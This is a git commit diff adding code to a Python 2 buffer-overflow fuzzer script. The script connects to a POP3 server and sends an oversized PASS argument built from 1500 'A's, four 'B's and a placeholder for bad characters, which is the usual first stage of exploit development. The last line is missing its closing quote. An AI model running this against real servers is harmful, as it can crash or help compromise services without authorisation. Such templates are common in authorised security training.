6c4149899dbd5e3bf9d6366827cdc7810f031cdf
1urch <charleshreed10@gmail.com>
2023-02-05 00:22:26 -0500

    Update bof-fuzzer.py

--- bof-fuzzer.py
+++ bof-fuzzer.py
@@ -3,8 +3,22 @@ import socket
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+ip=''
+port=1337
 badchars = ""
 #insert bad charactiers above
 
 buffer="A"*1500 + "B"*4 + badchars
 #
+
+try:
+    print "\nSending  buffer..."
+    s.connect((ip,port))
+    data = s.recv(1024)
+    s.send('USER username' +'\r\n')
+    data = s.recv(1024)
+    s.send('PASS ' + buffer + '\r\n')
+    s.close()
+    print "\nDone!"
+except:
+    print "Could not connect to POP3!
